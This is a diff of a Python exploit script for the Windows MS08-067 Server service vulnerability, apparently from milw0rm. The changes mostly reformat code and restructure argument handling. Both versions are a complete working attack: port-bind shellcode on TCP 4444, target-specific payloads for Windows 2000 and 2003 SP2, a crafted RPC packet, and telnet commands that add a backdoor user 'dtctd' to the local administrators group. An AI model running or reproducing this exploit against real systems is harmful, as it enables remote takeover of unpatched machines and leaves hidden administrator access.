@@ -6,7 +6,6 @@
 #   Email: d3basis.m0hanty @ gmail.com
 #############################################################################
 
-import struct
 import sys
 import telnetlib
 import time
@@ -25,7 +24,6 @@ except ImportError, _:
     print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'
     sys.exit(1)
 
-
 print '#######################################################################'
 print '#   MS08-067 Exploit by Debasis Mohanty (aka Tr0y/nopsled)'
 print '#   www.hackingspirits.com'
@@ -34,8 +32,8 @@ print '#   Email: d3basis.m0hanty @ gmail.com'
 print '#######################################################################\n'
 
 
-#Portbind shellcode from metasploit; Binds port to TCP port 4444
-shellcode  = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+# Portbind shellcode from metasploit; Binds port to TCP port 4444
+shellcode = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
 shellcode += "\x29\xc9\x83\xe9\xb0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xe9"
 shellcode += "\x4a\xb6\xa9\x83\xee\xfc\xe2\xf4\x15\x20\x5d\xe4\x01\xb3\x49\x56"
 shellcode += "\x16\x2a\x3d\xc5\xcd\x6e\x3d\xec\xd5\xc1\xca\xac\x91\x4b\x59\x22"
@@ -60,7 +58,7 @@ shellcode += "\x62\x1d\x4a\x2a\x2d\x2e\x49\x7f\xbb\xb5\x66\xc1\x19\xc0\xb2\xf6"
 shellcode += "\xba\xb5\x60\x56\x39\x4a\xb6\xa9"
 
 
-#Payload for Windows 2000 target
+# Payload for Windows 2000 target
 payload_1='\x41\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00'
 payload_1+='\x41\x41\x41\x41\x41\x41\x41\x41'
 payload_1+='\x41\x41\x41\x41\x41\x41\x41\x41'
@@ -74,7 +72,7 @@ payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43'
 payload_1+='\xeb\xcc'
 payload_1+='\x00\x00'
 
-#Payload for Windows 2003[SP2] target
+# Payload for Windows 2003[SP2] target
 payload_2='\x41\x00\x5c\x00'
 payload_2+='\x2e\x00\x2e\x00\x5c\x00\x2e\x00'
 payload_2+='\x2e\x00\x5c\x00\x0a\x32\xbb\x77'
@@ -88,21 +86,12 @@ payload_2+='\xbd\x77\x44\x44\x44\x44\x9e\xf5'
 payload_2+='\xbb\x77\x54\x13\xbf\x77\x37\xc6'
 payload_2+='\xba\x77\xf9\x75\xbd\x77\x00\x00'
 
-
-if sys.argv[2]=='1':    #Windows 2000 Payload
-    payload=payload_1
-    print '[-]Windows 2000 payload loaded'
-if sys.argv[2]=='2':    #Windows 2003[SP2] Payload
-    payload=payload_2
-    print '[-]Windows 2003[SP2] payload loaded'
-
-
 class SRVSVC_Exploit(Thread):
     def __init__(self, target, osver, port=445):
         super(SRVSVC_Exploit, self).__init__()
-        self.__port   = port
-        self.target   = target
-        self.osver   = osver
+        self.__port = port
+        self.target = target
+        self.osver = osver
 
     def __DCEPacket(self):
         print '[-]Initiating connection'
@@ -113,57 +102,66 @@ class SRVSVC_Exploit(Thread):
         self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
 
         # Constructing Malicious Packet
-        self.__stub='\x01\x00\x00\x00'
-        self.__stub+='\xd6\x00\x00\x00\x00\x00\x00\x00\xd6\x00\x00\x00'
-        self.__stub+=shellcode
-        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
-        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
-        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
-        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
-        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
-        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
-        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
-        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
-        self.__stub+='\x00\x00\x00\x00'
-        self.__stub+='\x2f\x00\x00\x00\x00\x00\x00\x00\x2f\x00\x00\x00'
-        self.__stub+=payload
-        self.__stub+='\x00\x00\x00\x00'
-        self.__stub+='\x02\x00\x00\x00\x02\x00\x00\x00'
-        self.__stub+='\x00\x00\x00\x00\x02\x00\x00\x00'
-        self.__stub+='\x5c\x00\x00\x00\x01\x00\x00\x00'
-        self.__stub+='\x01\x00\x00\x00'
+        self.__stub = '\x01\x00\x00\x00'
+        self.__stub += '\xd6\x00\x00\x00\x00\x00\x00\x00\xd6\x00\x00\x00'
+        self.__stub += shellcode
+        self.__stub += '\x41\x41\x41\x41\x41\x41\x41\x41'
+        self.__stub += '\x41\x41\x41\x41\x41\x41\x41\x41'
+        self.__stub += '\x41\x41\x41\x41\x41\x41\x41\x41'
+        self.__stub += '\x41\x41\x41\x41\x41\x41\x41\x41'
+        self.__stub += '\x41\x41\x41\x41\x41\x41\x41\x41'
+        self.__stub += '\x41\x41\x41\x41\x41\x41\x41\x41'
+        self.__stub += '\x41\x41\x41\x41\x41\x41\x41\x41'
+        self.__stub += '\x41\x41\x41\x41\x41\x41\x41\x41'
+        self.__stub += '\x00\x00\x00\x00'
+        self.__stub += '\x2f\x00\x00\x00\x00\x00\x00\x00\x2f\x00\x00\x00'
+        self.__stub += payload
+        self.__stub += '\x00\x00\x00\x00'
+        self.__stub += '\x02\x00\x00\x00\x02\x00\x00\x00'
+        self.__stub += '\x00\x00\x00\x00\x02\x00\x00\x00'
+        self.__stub += '\x5c\x00\x00\x00\x01\x00\x00\x00'
+        self.__stub += '\x01\x00\x00\x00'
         return
 
     def run(self):
         self.__DCEPacket()
-        self.__dce.call(0x1f, self.__stub)   #0x1f (or 31)- NetPathCanonicalize Operation
+        self.__dce.call(0x1f, self.__stub)   # 0x1f (or 31)- NetPathCanonicalize Operation
         print '[-]Exploit sent to target successfully...\n[1]Telnet to port 4444 on target machine...'
+
         time.sleep(2)
+        print '[-]Connecting to through Telnet...'
         tn = telnetlib.Telnet(target, 4444)
-        print tn.read_eager()
+        print '[-]Adding new user...'
         tn.write("net user /add dtctd moonshine\n")
-        print tn.read_eager()
+        print '[-]Adding new user to local admin group...'
         tn.write("net localgroup administrators dtctd /add\n")
-        print tn.read_eager()
+        print '[-]Finished adding user to local admin group'
         tn.write("exit\n")
         print tn.read_all()
 
 
 if __name__ == '__main__':
-       try:
-               target = sys.argv[1]
-               osver = sys.argv[2]
-       except IndexError:
-               print '\nUsage: %s <target ip> <os version>\n' % sys.argv[0]
-               print 'Example: srvsvcexpl.py 192.168.1.1 2\n'
-               print 'Select OS Version'
-               print '[-]Windows 2000: OS Version = 1'
-               print '[-]Windows 2003[SP2]: OS Version = 2'
+    if len(sys.argv) != 3:
+        print '\nUsage: %s <target ip> <os version>\n' % sys.argv[0]
+        print 'Example: MS08-067.py 192.168.1.1 2\n'
+        print 'Select OS Version'
+        print '[-]Windows 2000: OS Version = 1'
+        print '[-]Windows 2003[SP2]: OS Version = 2'
+        sys.exit(0)
 
-               sys.exit(-1)
+    target = sys.argv[1]
+    osver = sys.argv[2]
 
-current = SRVSVC_Exploit(target, osver)
-current.start()
-#print '[-]Exploit sent to target successfully...\n[-]Telnet to port 4444 on target machine...'
+    if osver == '1':    # Windows 2000 Payload
+        payload = payload_1
+        print '[-]Windows 2000 payload loaded'
+    elif osver == '2':    # Windows 2003[SP2] Payload
+        payload = payload_2
+        print '[-]Windows 2003[SP2] payload loaded'
+    else:
+        print '[-]Payload has to be either 1 or 2'
+
+    current = SRVSVC_Exploit(target, osver)
+    current.start()
 
 # milw0rm.com [2008-11-16]
